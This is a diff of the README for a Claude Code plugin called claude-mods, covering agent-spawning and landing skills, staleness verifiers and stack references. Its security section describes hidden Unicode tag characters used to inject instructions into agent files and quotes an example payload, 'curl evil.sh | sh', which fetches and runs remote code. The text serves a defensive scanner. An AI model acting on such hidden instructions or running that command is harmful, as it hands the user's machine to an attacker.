@@ -10,13 +10,11 @@
 [![Claude Code](https://img.shields.io/badge/Claude%20Code-plugin-blueviolet?logo=anthropic)](https://docs.anthropic.com/en/docs/claude-code)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-> *A comprehensive extension toolkit that transforms Claude Code into a specialized development powerhouse.*
+> *Doctrine you can execute. Knowledge that knows when it's stale. Agents that land their own work.*
 
-**claude-mods** is a production-ready plugin that extends Claude Code with 108 specialized skills, 3 expert agents, 13 output styles, 13 hooks, and modern CLI tools designed for real-world development workflows. Whether you're debugging React hooks, optimizing PostgreSQL queries, or building production CLI applications, this toolkit equips Claude with the domain expertise and procedural knowledge to work at expert level across multiple technology stacks.
+**claude-mods** is a Claude Code plugin built on one premise: a skill that only *tells* the model something is a suggestion, and a skill that ships a gate is a guarantee. Its 108 skills carry the expert depth you'd expect - React, Rust, PostgreSQL, Cloudflare Workers, Next.js - but the ones that earn the install are the ones that run *agents*: a headless-worker spawner, a test-gated landing queue for parallel branches, a graduated-autonomy ladder for scheduled loops, and a security layer pointed at the agent itself. 58 skills ship executable tooling, 52 ship their own test suites, and 21 carry staleness verifiers that trip when the world moves under them.
 
-Built on the [Agent Skills specification](https://agentskills.io/specification) (an open standard backed by Anthropic, Vercel, Google, Microsoft, and 40+ agent platforms), claude-mods fills critical gaps in Claude Code's capabilities: persistent session state that survives across machines, on-demand expert knowledge for specialized domains, token-efficient modern CLI tools (10-100x faster than traditional alternatives), and proven workflow patterns for TDD, code review, and feature development. The toolkit implements Anthropic's [recommended patterns for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents), ensuring your development context never vanishes when sessions end.
-
-From Python async patterns to Rust ownership models, from AWS Fargate deployments to Craft CMS development - claude-mods provides the specialized knowledge and tools that transform Claude from a general-purpose assistant into a domain expert who understands your stack, remembers your workflow, and ships production code.
+Built on the [Agent Skills specification](https://agentskills.io/specification) (an open standard backed by Anthropic, Vercel, Google, Microsoft, and 40+ agent platforms) and Anthropic's [patterns for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents), it installs as a standard plugin and toggles off as easily as it toggles on.
 
 **3 agents. 108 skills. 13 styles. 13 hooks. 14 rules. One install.**
 
@@ -43,7 +41,7 @@ From Python async patterns to Rust ownership models, from AWS Fargate deployment
 - 🎨 **`svg-brand-tint-ops` skill** — a zero-dependency in-browser SVG studio. Recolour any SVG to a brand palette via a token-driven **tri-tone** (`feColorMatrix` desaturate → `feComponentTransfer` grey-ramp remap → theme-aware CSS-filter bake), plus a from-scratch raster **vectoriser** (PNG → SVG) built on a **Potrace-paper geometry stage** — tolerance-tube straightness, penalty-DP optimal polygon, sub-pixel vertex adjustment, and alphamax corner analysis, reimplemented from the freely published Selinger 2003 paper (no GPL code) — over soft-field marching-squares with **alpha-aware palette handling** (matte de-blending, anti-alias fringe cull, blend-veto) that keeps flat-colour brand logos crisp. B&W / posterised / colour trace modes, a photographic filter stack, curated Google Fonts on SVG `<text>`, element hover-inspect, before/after split, and palette-from-image. Ships a ~90-line dependency-free static server (`scripts/server.mjs`), a headless trace CLI (`scripts/trace.mjs`) sharing one canonical engine with the browser tool (`assets/trace-core.mjs`, no drift), a colour-math + trace + theme-bake reference, and a 22-assertion offline test suite.
 
 **v3.5.0** (July 2026)
-- 📐 **`isometric-ops` skill** — isometric illustrative assets end to end: creation, refinement, composition, and export for websites and games. **14 references** anchor the exact projection math (true isometric 30° vs **2:1 dimetric 26.565°** — the mislabel that breaks tilesets — with every constant derived and machine-checked by a §7 staleness verifier), coordinate transforms + y-sort depth doctrine, the tile-spec discipline, SVG/CSS/three.js generation, Aseprite pixel-art workflow, dual Blender ortho rigs (60° dimetric vs 54.736° true iso), engine tilemaps (Godot 4 / Unity / Phaser 3), and the full AI pipeline — Recraft/Midjourney/Flux+LoRA generation under **ControlNet depth/MLSD structure control**, upscale + vectorization ladders, and licence discipline that checks AI-training clauses. Scripts: `iso-math.py` (constants/transforms/grid generator), `tile-validate.py` (AI-tile QA: halo, bleed, anchor, palette), `sheet-pack.py` (spritesheet + atlas). Headlined by **iso-studio** — a zero-dependency browser scene composer with snap-to-grid staging, footprint-aware y-sort, docked control palettes, PNG/SVG/scene-JSON export, and a blockout mode that exports **depth + lineart maps straight into ControlNet conditioning** — built alongside the skill and extracted to [its own repo](https://github.com/0xDarkMatter/iso-studio) (an app with a roadmap and asset library is a product, not a skill resource).
+- 📐 **`isometric-ops` skill** — isometric illustrative assets end to end: creation, refinement, composition, and export for websites and games. **14 references** anchor the exact projection math (true isometric 30° vs **2:1 dimetric 26.565°** — the mislabel that breaks tilesets — with every constant derived and machine-checked by a §7 staleness verifier), coordinate transforms + y-sort depth doctrine, the tile-spec discipline, SVG/CSS/three.js generation, Aseprite pixel-art workflow, dual Blender ortho rigs (60° dimetric vs 54.736° true iso), engine tilemaps (Godot 4 / Unity / Phaser 3), and the full AI pipeline — Recraft/Midjourney/Flux+LoRA generation under **ControlNet depth/MLSD structure control**, upscale + vectorization ladders, and licence discipline that checks AI-training clauses. Scripts: `iso-math.py` (constants/transforms/grid generator), `tile-validate.py` (AI-tile QA: halo, bleed, anchor, palette), `sheet-pack.py` (spritesheet + atlas). Headlined by **iso-studio** — a zero-dependency browser scene composer with snap-to-grid staging, footprint-aware y-sort, docked control palettes, PNG/SVG/scene-JSON export, and a blockout mode that exports **depth + lineart maps straight into ControlNet conditioning** — built alongside the skill and extracted to its own repo, `iso-studio` (not yet published) (an app with a roadmap and asset library is a product, not a skill resource).
 
 **v3.4.0** (June 2026)
 - 📊 **`r-ops` skill** — the set's first data-science skill: a tidyverse-first, current-best-practice reference for modern R (2024+). `SKILL.md` routes an import → tidy → transform → visualize → model → communicate workflow across **9 reference files (~115 KB)** — tidyverse-core, import-io, strings-dates-factors, visualization, iteration-functional, modeling-stats, data-table, time-series, workflow-tooling. Leads with current idioms (native `|>`, dplyr `.by=`, the `\(x)` lambda, `across()`, `list_rbind`, `slice_*`, tidymodels, the tidyverts `tsibble`/`fable` stack, Quarto + renv) and names base R / `data.table` where they win. Ships a 43-assertion offline self-test plus a `check-r-facts.py` §7 staleness verifier (`--offline` asserts every catalogued CRAN package is still named in the prose and the currency note carries a year; `--live` resolves each package on CRAN) so the modern-stack claim is **machine-enforced, not asserted**. Salvaged and freshened from the stale stacked PR #6 (which also duplicated the already-shipped supply-chain-defense), re-landed clean off current `main`.
@@ -58,27 +56,61 @@ From Python async patterns to Rust ownership models, from AWS Fargate deployment
 
 ## Why claude-mods?
 
-Claude Code is powerful out of the box, but it has gaps. This toolkit fills them:
+Every skill collection promises "expert knowledge on demand". Most deliver a markdown file. The model reads it, and whether it *does* anything with it is a matter of hope.
 
-- **Session continuity** — Tasks vanish when sessions end. We fix that with `/save` and `/sync`, implementing Anthropic's [recommended pattern](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) for long-running agents.
+claude-mods starts from a different premise: **doctrine you can execute.** The skills that matter here don't just describe a discipline - they ship the script that enforces it, the test that proves it, and the companion rule that makes it binding on every task. Four pillars carry the weight.
 
-- **Expert-level knowledge on demand** — 108 on-demand skills covering React, TypeScript, Python, Go, Rust, PostgreSQL, and more, plus 3 specialized agents reserved for genuine context-isolation/worker roles (git operations, web scraping, project reorganization). Skills-first: knowledge loads when relevant instead of living in heavyweight agent prompts.
+### 1. It operates agents, not just frameworks
 
-- **Modern CLI tools** — Stop using `grep`, `find`, and `cat`. Our rules automatically prefer `ripgrep`, `fd`, `eza`, and `bat` — 10-100x faster and token-efficient.
+The catalogue's centre of gravity is a layer most toolkits don't have at all - skills for *running agents*, composed into a lifecycle:
 
-- **Smart web fetching** — A fallback hierarchy that actually works: WebFetch → Jina Reader → Firecrawl. No more "I can't access that URL."
+| Layer | Skill | What it actually does |
+|---|---|---|
+| **Spawn** | [`fleet-worker`](skills/fleet-worker/) | A cheap headless `claude -p` - GLM via z.ai, or Sonnet/Haiku - with Claude Code's full tool harness, isolated in its own git worktree and `CLAUDE_CONFIG_DIR` so it can't reach your credentials |
+| **Land** | [`fleet-ops`](skills/fleet-ops/) | A sequential, test-gated landing queue for parallel branches. It *refuses* to land when its test command is unarmed rather than passing vacuously, and detects a live peer writer before it touches a checkout |
+| **Govern** | [`loop-ops`](skills/loop-ops/) | The L1 → L3 risk ladder for scheduled and autonomous loops. `loop-check` refuses a green light on an unbounded scope, a missing gate or an undefined escalation - a loop with no kill switch doesn't get scheduled |
+| **Improve** | [`iterate`](skills/iterate/) | Karpathy-style single-metric autoresearch: modify, measure, keep or discard, with git as memory and bisect-on-regression |
 
-- **Workflow patterns** — TDD cycles, code review, feature development, debugging — all documented with Anthropic's best practices.
+Native primitives spawn; claude-mods lands. That positioning - against agent teams, background agents and `CronCreate` alike - is deliberate. The plumbing belongs to the platform; the *discipline* is what a toolkit adds.
 
-## Key Benefits
+### 2. It defends the agent, not just the code
 
-- **Persistent task state** — Pick up exactly where you left off, even across machines
-- **Domain expertise** — Agents trained on framework docs, not just general knowledge
-- **Token efficiency** — Modern CLI tools produce cleaner output, saving context window
-- **Team sharing** — Git-trackable state files work across your whole team
-- **Production-ready** — Validated test suite, proper plugin format, comprehensive docs
-- **Extended thinking** — Built-in guidance for "think hard" and "ultrathink" triggers
-- **Zero lock-in** — Standard Claude Code plugin format, toggle on/off anytime
+An agent that installs packages, reads web pages and edits its own settings has an attack surface no linter covers. Three skills and their companion rules close it:
+
+- [`supply-chain-defense`](skills/supply-chain-defense/) - behavioural-first, because CVE tools report yesterday's known-bad and the 2026 worm family publishes and self-propagates inside the window *before* an advisory exists. A 7-day cooldown gate, Socket.dev scoring, and a self-integrity scan for persistence hooks written into Claude Code's own settings.
+- [`prompt-injection-defense`](skills/prompt-injection-defense/) - hidden-Unicode hygiene for instruction files. A `U+E0000` tag-block run can encode `curl evil.sh | sh` and render as nothing; the scanner reads bytes, not glyphs, and the pre-commit hook refuses to let one in.
+- [`push-gate`](skills/push-gate/), [`worktree-boundaries`](rules/worktree-boundaries.md) and [`release-review`](rules/release-review.md) - the blast-radius rules. Secrets never leave, other sessions' worktrees are never touched, releases are never auto-published.
+
+### 3. Its knowledge knows when it's stale
+
+A skill that says "modern R" or "Hono v4" is making a claim that will be false within a year. claude-mods makes those claims **machine-checked**: 21 skills ship a `check-*-facts` verifier with an `--offline` mode (does the prose still match the catalogue?) and a `--live` mode (does the catalogue still match the world?). CI runs the first on every push; a scheduled workflow runs the second every Monday. When TypeScript ships a native compiler or ADA deadlines move, a tripwire fires instead of a reference quietly rotting.
+
+The same instinct runs through the tooling: 58 skills ship real scripts, 52 ship their own `tests/run.sh`, 44 gates use exit-10 as a machine-readable findings signal, and 5.6 MB of references load progressively - ~100 tokens per skill until one is relevant.
+
+### 4. The stacks are fuel, not filler
+
+A model's training freezes on a date. Frameworks don't. So the agent writes `middleware.ts` after Next.js moved to `proxy.ts`, reaches for `unstable_cache` when `use cache` has shipped, and assumes `tsc` semantics from before the native compiler - fluently, confidently, and at scale. A human developer hesitates and checks. An agent doesn't. That's the specific way stale knowledge is worse in agentic work than in ordinary work, and it's the problem the stack skills exist to solve.
+
+Each one is a **currency layer over the model's priors** - React, Vue, Next.js, TypeScript, Go, Rust, Laravel, Payload, Hono, Cloudflare Workers, PostgreSQL, SQLite/D1, Terraform and the rest - and they're built to be trusted by an agent, not read by a human:
+
+- **Production-mined, not tutorial-shaped.** 200 KB on SQLite/D1 carries the migration that times out but applies and the `.batch()` semantics that bite; 152 KB on Postgres; 104 KB on TypeScript's TS 7 adoption path; `hono-ops` distilled from a live multi-tenant Worker. The gotchas the docs don't mention are the ones an agent walks straight into.
+- **Version-aware, not newest-wins.** `nextjs-ops`' audit reads the project's installed major and gates its rules on *that* - it won't demand a v16 idiom of a v14 codebase. A skill that only knows the latest is a liability on any repo older than a month.
+- **Pinned and verified.** Eleven stack skills carry an `assets/*-facts.json` with an `as_of` date, and pillar 3's verifiers check it against the world. The claim "modern TypeScript" is machine-enforced, not asserted.
+- **Nearly free to carry.** ~100 tokens per skill until one triggers, then references load on demand. 108 skills cost roughly 10k tokens of descriptions; the 5.6 MB behind them costs nothing until you're actually in that stack.
+
+And the payoff loops back to pillar 1. A `fleet-worker`'s isolated config dir starts clean - you *provision* skills into it. A GLM worker with `hono-ops` loaded writes better Hono than GLM alone, which is why the skill's own docs call provisioning *"often the cheapest way to lift a weak model's output on a specialized task."* The stack skills are what turn "a cheaper brain" from a cost-cut into a real option: the discipline layers decide *what* an agent may do, and the stack layers decide whether what it does is any good.
+
+Around all of that: `/save` + `/sync` session continuity that's git-trackable across machines, a modern-CLI rule set (`rg`, `fd`, `uv`, `sd` - 10-100x faster and far cleaner in a context window), and a web-fetch fallback chain that doesn't give up at the first 403.
+
+### The ecosystem
+
+Some things outgrew a skill directory. An app with a dashboard and a roadmap is a product, not a skill resource - so they became repos, and stay wired in:
+
+| Project | What it is | How it fits |
+|---|---|---|
+| [**fleetflow**](https://github.com/0xDarkMatter/fleetflow) | Heterogeneous cross-provider fleets - GLM, Codex, Grok, Pi and Anthropic models as OS-process workers, with adversarial cross-model verification, journalled resume and a machine-wide dashboard | The layer above `fleet-worker` when you want *different* models per work class. Still mounts as a skill. |
+| [**conclave**](https://github.com/0xDarkMatter/conclave) | A universal remote for LLMs - one syntax for any model, or all of them in parallel with a judge synthesising the verdict | The second-opinion engine. When one model's answer isn't enough, convene the council. |
+| [**flarecrawl**](https://github.com/0xDarkMatter/flarecrawl) | Cloudflare Browser Rendering as a Firecrawl alternative, cost-efficient at scale | A cheaper engine for the anti-bot tier of the web-fetch hierarchy - Browser Rendering pricing instead of a per-page SaaS bill. |
 
 ## Structure
 
@@ -165,7 +197,7 @@ skill-name/
 2. SKILL.md body - Loaded when skill triggers (<5k words)
 3. Bundled resources - Loaded only when Claude needs them
 
-All skills have the complete directory structure, even if `scripts/`, `references/`, or `assets/` are currently empty. This ensures consistency and makes it easy to add bundled resources later.
+Skills carry the full layout by convention - a directory may sit empty until it's needed, so bundled resources always have an obvious home. In practice 93 skills ship references and 58 ship scripts.
 
 See [skill-creator](skills/skill-creator/) for the complete guide.
 
@@ -208,7 +240,7 @@ See [skill-creator](skills/skill-creator/) for the complete guide.
 | [genart-ops](skills/genart-ops/) | Generative art - three.js scenes, p5.js sketches, SVG generation, GLSL shaders, procedural algorithms, colour theory |
 | [threejs-ops](skills/threejs-ops/) | App/game-scale three.js - import maps + ES-module reality, GLTF pipeline (DRACO/KTX2/meshopt, gltf-transform), AnimationMixer crossfades, fixed-timestep loops, rapier/cannon-es physics, R3F + drei, InstancedMesh/LOD/disposal discipline, boids/steering actors; npm staleness verifier |
 | [mapbox-ops](skills/mapbox-ops/) | Advanced Mapbox GL JS (web v3) - custom markers, thematic dataviz, 3D/terrain, cinematic camera, style composition, expressions, performance, gotchas; headless Playwright map verifier |
-| [isometric-ops](skills/isometric-ops/) | Isometric asset creation end-to-end - exact projection math (true iso vs 2:1 dimetric), SVG/CSS/three.js generation, pixel-art + Blender pre-render pipelines, engine tilemaps, AI generation with ControlNet structure control, tile QA + atlas packing scripts; routes to the companion [iso-studio](https://github.com/0xDarkMatter/iso-studio) scene composer (snap-to-grid, y-sort, blockout-to-ControlNet export) |
+| [isometric-ops](skills/isometric-ops/) | Isometric asset creation end-to-end - exact projection math (true iso vs 2:1 dimetric), SVG/CSS/three.js generation, pixel-art + Blender pre-render pipelines, engine tilemaps, AI generation with ControlNet structure control, tile QA + atlas packing scripts; routes to the companion `iso-studio` (not yet published) scene composer (snap-to-grid, y-sort, blockout-to-ControlNet export) |
 | [svg-brand-tint-ops](skills/svg-brand-tint-ops/) | Zero-dep in-browser SVG studio - token-driven tri-tone brand recolour (feColorMatrix/feComponentTransfer + theme-aware CSS-filter bake) and a from-scratch raster vectoriser (PNG->SVG) with a Potrace-paper geometry stage (straightness/optimal-polygon/vertex-adjust/alphamax, no GPL code) over soft-field marching squares with alpha-aware palette handling; curated Google Fonts, filter stack, dependency-free server + headless trace CLI sharing one engine |
 | [unfold-admin](skills/unfold-admin/) | Django Unfold admin theme - ModelAdmin, dashboards, filters, widgets, theming |
 
@@ -466,83 +498,17 @@ just list-agents  # List all agents
 
 ## Session Continuity
 
-The `/save` and `/sync` commands make session state **portable**.
+Claude Code remembers conversation history (`--resume`), Claude-curated learnings (auto-memory) and in-session checkpoints (`/rewind`) - all machine-local, and none of it is **task state**. Tasks are session-scoped and deleted when the session ends, by design.
 
-**What's native now:** Claude Code remembers a lot on its own. `--resume` and the session picker restore conversation history, auto-memory writes a per-project `MEMORY.md` with learnings Claude decides are worth keeping, and `/rewind` checkpoints let you roll back within a session. All of it is machine-local — per the docs, auto-memory files "are not shared across machines or cloud environments" — and it remembers context *for you*, in a format Claude curates.
-
-**What's still missing:** task state. Tasks (created via TaskCreate, managed via TaskList/TaskUpdate) are session-scoped and deleted when the session ends — by design. And none of the native state is something you can commit, review, or hand to a teammate.
-
-**What `/save` + `/sync` add:** a state file you control — task restore, structured git/PR context, explicit human-readable handoff notes, and session-ID bridging. Because it lives in your repo, it's git-trackable, team-shareable, and follows you across machines. This implements the pattern from Anthropic's [Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents):
-
-> "Every subsequent session asks the model to make incremental progress, then leave structured updates."
-
-### What Persists vs What Doesn't
-
-| Claude Code Feature | Persists? | Scope |
-|---------------------|-----------|-------|
-| Conversation history | Yes | This machine (`--resume` / session picker) |
-| Auto-memory (MEMORY.md) | Yes | This machine, per repo — Claude-curated learnings, not task state |
-| CLAUDE.md context | Yes | Wherever you commit it |
-| Tasks | **No** | Deleted on session end |
-| Plan Mode state | **No** | In-memory only |
-
-### Session Workflow
+`/save` + `/sync` add the piece that's missing: a state file you control, in your repo - task restore, structured git/PR context, explicit handoff notes and session-ID bridging - so a session can be resumed on another machine, reviewed in a diff, or handed to a teammate. It implements the pattern from Anthropic's [Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents): every session makes incremental progress, then leaves structured updates.
 
 ```
-Session 1:
-  /sync                              # Bootstrap + restore saved state
-  [work on tasks]
-  /save "Stopped at auth module"     # Writes session-cache.json + MEMORY.md
-
-Session 2:
-  [MEMORY.md auto-loaded: "Goal: Auth, Branch: feature/auth, PR: #42"]
-  /sync                              # Full restore: tasks, plan, git, PR
-  → "Previous session: abc123... (claude --resume abc123...)"
-  → "In progress: Auth module refactor"
-  → "PR: #42 (claude --from-pr 42)"
+/sync                              # bootstrap + restore saved state
+[work]
+/save "Stopped at auth module"     # writes .claude/session-cache.json + MEMORY.md
 ```
 
-### Why Not Just Use `--resume` or Auto-Memory?
-
-| Feature | `--resume` | Auto-memory | `/save` + `/sync` |
-|---------|------------|-------------|-------------------|
-| Conversation history | Yes | No | No |
-| Learnings/preferences | No | Yes (Claude-curated) | No |
-| Tasks | **No** | **No** | Yes |
-| Git/PR context | PR only (`--from-pr`) | Incidental | Yes (structured, `gh`-detected) |
-| Session ID bridging | N/A | No | Yes (suggests `--resume <id>`) |
-| Explicit handoff notes | No | No | Yes |
-| Git-trackable | No | No | Yes |
-| Works across machines | No | No (machine-local) | Yes (if committed) |
-| Team sharing | No | No | Yes |
-
-**Use all three together:** `claude --resume` for conversation context, auto-memory for accumulated learnings, `/sync` for task state and handoff. Since v3.1, `/save` stores your session ID so `/sync` can suggest the exact `--resume` command.
-
-### Session Cache Schema (v3.1)
-
-The `.claude/session-cache.json` file stores full task objects:
-
-```json
-{
-  "version": "3.1",
-  "session_id": "977c26c9-60fa-4afc-a628-a68f8043b1ab",
-  "tasks": [
-    {
-      "subject": "Task title",
-      "description": "Detailed description",
-      "activeForm": "Working on task",
-      "status": "completed|in_progress|pending",
-      "blockedBy": [0, 1]
-    }
-  ],
-  "plan": { "file": "docs/PLAN.md", "goal": "...", "current_step": "...", "progress_percent": 40 },
-  "git": { "branch": "main", "last_commit": "abc123", "pr_number": 42, "pr_url": "https://..." },
-  "memory": { "synced": true },
-  "notes": "Session notes"
-}
-```
-
-**Compatibility:** `/sync` handles both v3.0 and v3.1 files gracefully. Missing v3.1 fields are treated as absent.
+Use all three together: `--resume` for conversation, auto-memory for learnings, `/sync` for tasks and handoff. The persistence matrix, the full workflow and the `session-cache.json` schema live in [docs/SESSION-CONTINUITY.md](docs/SESSION-CONTINUITY.md).
 
 ## Updating
 
@@ -556,29 +522,17 @@ Then re-run the install script to update your global Claude configuration.
 
 ### MCP Tool Search
 
-When using multiple MCP servers (Chrome DevTools, Vibe Kanban, etc.), their tool definitions consume context. Enable Tool Search to load tools on-demand:
+Tool Search is **on by default**: MCP tool definitions are deferred and loaded on demand instead of consuming context at session start. Three things are worth knowing:
 
-```json
-// .claude/settings.local.json
-{
-  "env": {
-    "ENABLE_TOOL_SEARCH": "true"
-  }
-}
-```
+- **It silently switches off behind a proxy.** When `ANTHROPIC_BASE_URL` points at a non-first-party host - a `fleet-worker` on GLM via z.ai, or any LLM gateway - Claude Code loads every tool upfront, because most proxies don't forward `tool_reference` blocks. Set `ENABLE_TOOL_SEARCH=true` explicitly if yours does.
+- **Threshold mode** - `ENABLE_TOOL_SEARCH=auto` loads tools upfront until their definitions reach 10% of the context window, then defers all of them.
+- **Exempt what you use every turn** - `"alwaysLoad": true` on a server entry (or `"anthropic/alwaysLoad": true` in a tool's `_meta`) keeps it in context regardless.
 
-| Value | Behavior |
-|-------|----------|
-| `"auto"` | Enable when MCP tools > 10% of context (default) |
-| `"auto:5"` | Custom threshold (5%) |
-| `"true"` | Always enabled (recommended) |
-| `"false"` | Disabled |
-
-**Requirements:** Sonnet 4+ or Opus 4+ (Haiku not supported)
+Requires a model that supports `tool_reference` blocks: Sonnet 4.5, Haiku 4.5, Opus 4.5 and later. Docs: [Scale with MCP tool search](https://code.claude.com/docs/en/mcp#scale-with-mcp-tool-search).
 
 ### Skill Description Budget
 
-With 90+ skills installed (this plugin alone ships 97), skill descriptions can overflow the listing budget. All skill names are always listed, but descriptions share a budget of **1% of the model context window** — on overflow, least-invoked skills lose their descriptions first and **silently stop auto-triggering** (explicit `/name` invocation still works). Each skill's combined `description` + `when_to_use` is also truncated at **1,536 chars**, so trigger phrases belong at the front.
+With 90+ skills installed (this plugin alone ships 108), skill descriptions can overflow the listing budget. All skill names are always listed, but descriptions share a budget of **1% of the model context window** — on overflow, least-invoked skills lose their descriptions first and **silently stop auto-triggering** (explicit `/name` invocation still works). Each skill's combined `description` + `when_to_use` is also truncated at **1,536 chars**, so trigger phrases belong at the front.
 
 - **Check:** run `/doctor` — it shows whether the budget is overflowing and which skills are affected.
 - **Fix:** demote or disable skills you don't use via `skillOverrides` in settings (`"on"` / `"name-only"` / `"user-invocable-only"` / `"off"` per skill, or `/skills` + `Space`). Plugin skills are managed via `/plugin` instead.
